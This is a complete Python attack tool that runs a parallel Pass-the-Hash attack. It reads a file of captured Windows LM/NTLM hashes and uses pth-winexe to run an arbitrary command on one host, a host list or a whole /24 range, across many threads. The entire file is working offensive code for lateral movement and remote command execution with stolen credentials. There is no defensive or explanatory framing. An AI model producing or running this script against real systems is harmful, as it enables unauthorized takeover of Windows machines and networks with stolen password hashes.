#!/usr/bin/env python3
import datetime
import logging
from argparse import ArgumentParser
from subprocess import check_output as shell
from threading import Thread
from time import sleep

THREAD_POOL_EXHAUSTED_LIMIT = 10
DEFAULT_SLEEP_TIMER_IN_SECONDS = 0.5
DEFAULT_LOGGING_LEVEL = 'INFO'
DEFAULT_CMD_COMMAND = 'ipconfig'
DEFAULT_SOCKET_TIMEOUT_IN_SECONDS = 5


def read_file(file_name):
    with open(file_name, 'r', encoding='utf-8') as file:
        return [line.strip() for line in file.readlines() if line.strip()]


def current_date_time():
    return '{0:%Y-%m-%d %H:%M:%S}'.format(datetime.datetime.now())


def get_arguments():
    parser = ArgumentParser(
        description='Perform a parallel Passing-the-Hash attack on the given target(s).')
    parser.add_argument('--domain',
                        dest='domain',
                        default='',
                        required=False,
                        help='The network domain to use while attempting to pass the user\'s hash')
    parser.add_argument('--hashdump',
                        dest='hashdump',
                        required=True,
                        help='A txt file with a new-line separated list of captured hashes, '
                             'in the following format:'
                             ' user:uid:LM:NTLM:::')
    parser.add_argument('--cmd',
                        dest='cmd',
                        default=DEFAULT_CMD_COMMAND,
                        required=False,
                        help='A cmd command to execute on the targeted system(s). '
                             'Default is ' + DEFAULT_CMD_COMMAND)
    parser.add_argument('--ip',
                        dest='ip',
                        required=False,
                        help='A single IP address to perform Passing-the-Hash attack')
    parser.add_argument('--ip-range',
                        dest='ip_range',
                        required=False,
                        help='An IP range of the class C network to perform parallel Passing-the-Hash attack. '
                             'Should have a /24 suffix')
    parser.add_argument('--ip-file',
                        dest='ip_file',
                        required=False,
                        help='A txt file with a new line separated list of IP addresses.')
    parser.add_argument('--threads',
                        dest='threads',
                        default=THREAD_POOL_EXHAUSTED_LIMIT,
                        required=False,
                        help='A number of threads to use in parallel. Default is ' + str(
                            THREAD_POOL_EXHAUSTED_LIMIT) + ".")
    parser.add_argument('--sleep',
                        dest='sleep',
                        default=DEFAULT_SLEEP_TIMER_IN_SECONDS,
                        required=False,
                        help='Sleep timer in seconds before spawning new threads. Defailt is ' + str(
                            DEFAULT_SLEEP_TIMER_IN_SECONDS))
    parser.add_argument('-l',
                        '--logging',
                        dest='logging',
                        default=DEFAULT_LOGGING_LEVEL,
                        choices=['INFO', 'DEBUG', 'WARNING', "ERROR"],
                        required=False,
                        help='Logging level. Default is ' + DEFAULT_LOGGING_LEVEL)
    parser.add_argument('--timeout',
                        dest='timeout',
                        default=DEFAULT_SOCKET_TIMEOUT_IN_SECONDS,
                        required=False,
                        help='Default socket timeout timer in seconds. Default is ' + str(
                            DEFAULT_SOCKET_TIMEOUT_IN_SECONDS))

    options = parser.parse_args()
    if not options.ip_range and not options.ip_file and not options.ip:
        parser.error('You have to give something to attack, use --help for more info')
    return options


import os


class WindowsUserCredentials:
    def __init__(self, hashdump_line):
        chunks = hashdump_line.split(':')
        self.username = chunks[0]
        self.uid = chunks[1]
        if '**NOPASSWORD**' in chunks[2]:
            self.lm_hash = '00000000000000000000000000000000'
        else:
            self.lm_hash = chunks[2]
        self.ntlm_hash = chunks[3].upper()


def pass_the_hash(domain, ip, user_name, lm_hash, ntlm_hash, command, timeout):
    try:
        logging.debug('ATTEMPT - {domain}{user_name}%{lm_hash}:{ntlm_hash}//{ip} - {command}'
                      .format(domain=domain,
                              user_name=user_name,
                              lm_hash=lm_hash,
                              ntlm_hash=ntlm_hash,
                              ip=ip,
                              command=command))
        result = shell(['pth-winexe', '-U', domain + user_name + '%' + '{lm_hash}:{ntlm_hash}'.format(
            lm_hash=lm_hash,
            ntlm_hash=ntlm_hash), '//' + ip, command],
                       stderr=open(os.devnull, 'w'),
                       timeout=timeout)
        logging.info('{domain}{user_name}%{lm_hash}:{ntlm_hash}//{ip} - {result}'
                     .format(domain=domain,
                             user_name=user_name,
                             lm_hash=lm_hash,
                             ntlm_hash=ntlm_hash,
                             ip=ip,
                             result=result))
    except Exception as e:
        logging.debug("{domain}{user_name}%{lm_hash}:{ntlm_hash}//{ip} - {error}"
                      .format(domain=domain,
                              user_name=user_name,
                              lm_hash=lm_hash,
                              ntlm_hash=ntlm_hash,
                              ip=ip,
                              error=e))


def create_parallel_jobs(domain,
                         ip_addresses,
                         hashdump,
                         command,
                         timeout=DEFAULT_SOCKET_TIMEOUT_IN_SECONDS,
                         thread_limit=THREAD_POOL_EXHAUSTED_LIMIT,
                         sleep_timer_in_seconds=DEFAULT_SLEEP_TIMER_IN_SECONDS):
    threads = []
    hashed_credentials = [WindowsUserCredentials(line) for line in hashdump]
    logging.info('{len} users have been given for the pth'
                 .format(len=len(hashed_credentials)))
    if domain:
        domain = domain + '/'
    for credential in hashed_credentials:
        user_name = credential.username
        logging.info('Passing the hash of {user_name}'
                     .format(user_name=user_name))
        lm_hash = credential.lm_hash
        ntlm_hash = credential.ntlm_hash
        for ip in ip_addresses:
            while len(threads) >= thread_limit:
                sleep(sleep_timer_in_seconds)
                for thread in threads.copy():
                    if not thread.isAlive():
                        threads.remove(thread)
            try:

                thread = Thread(target=pass_the_hash, args=(domain,
                                                            ip,
                                                            user_name,
                                                            lm_hash,
                                                            ntlm_hash,
                                                            command,
                                                            timeout))
                thread.start()
                threads.append(thread)
            except Exception as e:
                logging.debug("{domain}{user_name}%{lm_hash}:{ntlm_hash}//{ip} - {error}"
                              .format(domain=domain,
                                      user_name=user_name,
                                      lm_hash=lm_hash,
                                      ntlm_hash=ntlm_hash,
                                      ip=ip,
                                      error=e))

        while any(thread.isAlive() for thread in threads):
            sleep(sleep_timer_in_seconds)


options = get_arguments()
logging.basicConfig(
    format='[%(levelname)s] - %(message)s',
    datefmt='%m/%d/%Y %I:%M:%S %p',
    level=options.logging)
logging.getLogger('urllib3.connectionpool').propagate = False

try:
    if options.ip:
        ip_addresses = [options.ip]
    elif options.ip_file:
        ip_addresses = read_file(options.ip_file)
    elif options.ip_range:
        ip_addresses = []
        chunks = options.ip_range.split('.')
        for i in range(int(chunks[3].split('/')[0]), 255):
            ip_addresses.append("{}.{}.{}.{}".format(chunks[0], chunks[1], chunks[2], str(i)))
    else:
        ip_addresses = []
    logging.info('Parallel Passing-the-Hash attack started at {now}'.format(now=current_date_time()))
    hashdump = read_file(options.hashdump)
    create_parallel_jobs(
        domain=options.domain,
        ip_addresses=ip_addresses,
        hashdump=hashdump,
        command=options.cmd,
        timeout=int(options.timeout),
        thread_limit=int(options.threads),
        sleep_timer_in_seconds=int(options.sleep))
    logging.info('Parallel Passing-the-Hash attack finished at {now}'.format(now=current_date_time()))
except Exception as e:
    logging.error(e)
    exit(1)
